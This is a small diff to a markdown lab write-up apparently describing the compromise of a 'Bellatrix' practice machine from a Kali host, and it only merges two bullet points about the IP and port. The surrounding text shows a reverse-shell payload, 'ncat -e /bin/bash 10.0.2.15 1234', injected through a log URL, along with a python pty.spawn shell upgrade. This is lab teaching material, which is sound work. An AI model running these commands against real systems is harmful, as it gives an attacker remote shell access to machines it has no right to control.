@@ -141,8 +141,7 @@ I have used Netcat as listener, a command-line utility that reads and writes dat
 After that we have to execute some code on the Bellatrix Machine to open a connection with the Kali Machine on port 1234 and spawn a process that executes */bin/bash*, so we do this by injecting code directly into the log URL. The code we inject is `ncat -e /bin/bash 10.0.2.15 1234`, where:
  - *ncat* is an advanced implementation of *nc* that offers many additional features
  - *-e* followed by */bin/bash* specifies to run the *bin/bash* program as a child process when a connection is established
- - 10.0.2.15 is the IP of the Kali Machine
- - 1234 is the port to connect to
+ - 10.0.2.15 and 1234 are the address and the port to connect to
 
 At this point we are in the scenario in which the Bellatrix Machine has a reverse shell, obtained with *netcat*, connected to our Kali Machine. However, there is a small drawback to this type of shell. That is, the shell is a very plain shell that doesn’t have any prompts or features like bash-completion. Hence, it is required to upgrade to an intelligent reverse shell.   
 We can use `python3 -c 'import pty;pty.spawn("/bin/bash")'` command, in which:
